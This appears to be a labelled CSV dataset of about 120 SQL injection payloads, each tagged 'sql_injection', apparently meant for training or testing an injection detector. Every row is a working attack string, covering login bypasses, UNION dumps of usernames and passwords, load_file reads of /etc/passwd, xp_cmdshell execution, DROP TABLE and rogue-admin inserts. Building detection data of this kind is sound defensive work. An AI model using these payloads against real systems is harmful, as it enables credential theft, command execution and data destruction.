"payload","sql_injection"
"' OR 1=1 --","sql_injection"
"' OR '1'='1","sql_injection"
"' OR ''='' --","sql_injection"
"' OR 1=1#","sql_injection"
"' OR '1'='1' /*","sql_injection"
"' OR TRUE --","sql_injection"
"' OR 1=1 LIMIT 1; --","sql_injection"
"' OR 1=1; /*","sql_injection"
"' OR 1=1 UNION SELECT NULL --","sql_injection"
"admin' OR 1=1 --","sql_injection"
"' OR EXISTS(SELECT 1) --","sql_injection"
"' OR NOT 1=2 --","sql_injection"
"' OR 'test'='test' --","sql_injection"
"' OR 2>1 --","sql_injection"
"' OR IF(1=1,1,0) --","sql_injection"
"' OR SLEEP(3) --","sql_injection"
"' OR BENCHMARK(1000000,MD5(1)) --","sql_injection"
"' OR 1337=1337 --","sql_injection"
"' OR ascii(lower('A'))=97 --","sql_injection"
"' OR 1=1 ORDER BY 1 --","sql_injection"
"' OR 1=1 ORDER BY 5 --","sql_injection"
"' OR RAND() < 0.9 --","sql_injection"
"' OR TRUE AND 'a'='a","sql_injection"
"' OR CASE WHEN (1=1) THEN 1 ELSE 0 END --","sql_injection"
"' UNION SELECT NULL,NULL --","sql_injection"
"' UNION SELECT 1,2,3 --","sql_injection"
"' UNION SELECT username,password FROM users --","sql_injection"
"' UNION ALL SELECT NULL --","sql_injection"
"' UNION ALL SELECT table_name,NULL FROM information_schema.tables --","sql_injection"
"' UNION SELECT load_file('/etc/passwd') --","sql_injection"
"' UNION SELECT version() --","sql_injection"
"' UNION SELECT @@hostname --","sql_injection"
"' UNION SELECT @@datadir --","sql_injection"
"' UNION SELECT @@version_compile_os --","sql_injection"
"' UNION SELECT group_concat(schema_name) FROM information_schema.schemata --","sql_injection"
"' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() --","sql_injection"
"' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users' --","sql_injection"
"' UNION SELECT null,concat(username,':',password) FROM users --","sql_injection"
"' UNION SELECT user(),database() --","sql_injection"
"' OR 1=1; EXEC xp_cmdshell('dir') --","sql_injection"
"' OR 1=1; EXEC xp_cmdshell 'whoami' --","sql_injection"
"' OR 1=1; EXEC master..xp_cmdshell 'ipconfig' --","sql_injection"
"' WAITFOR DELAY '0:0:5' --","sql_injection"
"' OR 1=1 WAITFOR DELAY '00:00:03' --","sql_injection"
"' OR 1=1; SHUTDOWN --","sql_injection"
"' OR 1=1; DROP TABLE users; --","sql_injection"
"' OR 1=1; UPDATE users SET admin=1 WHERE username='guest' --","sql_injection"
"' OR (SELECT COUNT(*) FROM users)>0 --","sql_injection"
"' OR 1 IN (SELECT 1) --","sql_injection"
"' OR 1 IN (SELECT password FROM users) --","sql_injection"
"' OR 1=(SELECT 1 FROM dual) --","sql_injection"
"' OR EXISTS(SELECT * FROM dual) --","sql_injection"
"' OR (SELECT @@version) LIKE '%' --","sql_injection"
"' OR ASCII(SUBSTRING(username,1,1))>64 --","sql_injection"
"' OR (SELECT SLEEP(2)) --","sql_injection"
"' OR SLEEP(5)#","sql_injection"
"' OR SLEEP(10)/*","sql_injection"
"' OR 1=1; SELECT * FROM credit_cards --","sql_injection"
"' OR 1=1; SELECT * FROM users INTO OUTFILE '/tmp/pwned.txt' --","sql_injection"
"' UNION SELECT NULL,LOAD_FILE('/etc/hosts') --","sql_injection"
"' UNION SELECT NULL,LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts') --","sql_injection"
"' AND 1=CONVERT(int,(SELECT @@version)) --","sql_injection"
"' AND ASCII('A')=65 --","sql_injection"
"' AND LENGTH(database())>0 --","sql_injection"
"' AND (SELECT COUNT(*) FROM users)>0 --","sql_injection"
"' AND (SELECT username FROM users LIMIT 1)='admin' --","sql_injection"
"' OR LOWER(USER())='root' --","sql_injection"
"' OR MID((SELECT database()),1,1)='t' --","sql_injection"
"' OR ORD(SUBSTRING((SELECT user()),1,1))=114 --","sql_injection"
"' OR 1=1/**/","sql_injection"
"' OR 1=1#test","sql_injection"
"' OR/**/1=1/**/--","sql_injection"
"' OR 1=1-- -","sql_injection"
"' OR/**/(SELECT 1)--","sql_injection"
"'||'1'='1","sql_injection"
"admin') OR ('1'='1","sql_injection"
"1 OR 1=1","sql_injection"
"1 OR TRUE","sql_injection"
"1 OR 1=1 LIMIT 1","sql_injection"
"1 OR SLEEP(5)","sql_injection"
"1 OR BENCHMARK(500000,MD5(1))","sql_injection"
"1 OR IF(1=1,1,0)","sql_injection"
"1 OR IF(version() LIKE '%',1,0)","sql_injection"
"1 AND 1=1","sql_injection"
"1 AND ASCII('A')=65","sql_injection"
"1 AND sleep(3)#","sql_injection"
"1 AND SLEEP(5) --","sql_injection"
"1 WAITFOR DELAY '00:00:02'","sql_injection"
"1 AND 1=(SELECT COUNT(*) FROM users)","sql_injection"
"1 AND 1=(SELECT 1 FROM information_schema.tables LIMIT 1)","sql_injection"
"1 UNION SELECT NULL,NULL","sql_injection"
"1 UNION SELECT 1,@@version","sql_injection"
"1 UNION SELECT table_name FROM information_schema.tables","sql_injection"
"1 UNION SELECT group_concat(column_name) FROM information_schema.columns","sql_injection"
"1 UNION SELECT load_file('/etc/passwd')","sql_injection"
"1 UNION SELECT user(),database()","sql_injection"
"1 UNION SELECT NULL,version()","sql_injection"
"1 UNION SELECT SLEEP(3),2","sql_injection"
"1 AND 1=CONVERT(int,@@version)","sql_injection"
"1 AND CAST('1' AS INT)=1","sql_injection"
"1 AND (SELECT version()) LIKE '%'","sql_injection"
"1 AND (SELECT COUNT(*) FROM users)>0","sql_injection"
"1 AND (SELECT LENGTH(database()))>0","sql_injection"
"1;(SELECT * FROM users)","sql_injection"
"1; DROP TABLE users;","sql_injection"
"1; SHUTDOWN;","sql_injection"
"1; EXEC xp_cmdshell 'dir'","sql_injection"
"1; EXEC master..xp_cmdshell 'whoami'","sql_injection"
"1'; DROP TABLE logins; --","sql_injection"
"1'; UPDATE accounts SET balance=99999 --","sql_injection"
"1'; INSERT INTO admin(username,password) VALUES('hax','123') --","sql_injection"
"1'; SELECT * FROM bank_accounts --","sql_injection"
"1 OR (SELECT SLEEP(3))","sql_injection"
"' OR (SELECT SLEEP(1))","sql_injection"
"admin' OR SLEEP(2) --","sql_injection"
"' OR 1=1 UNION SELECT database(),user() --","sql_injection"
"' AND 1=(SELECT 1 FROM mysql.user LIMIT 1) --","sql_injection"
"' OR 1=1 UNION SELECT NULL,@@secure_file_priv --","sql_injection"
"' UNION SELECT NULL,NULL,NULL,NULL,NULL --","sql_injection"
"' UNION SELECT NULL,username,password FROM users --","sql_injection"
"' UNION SELECT NULL,version(),user() --","sql_injection"
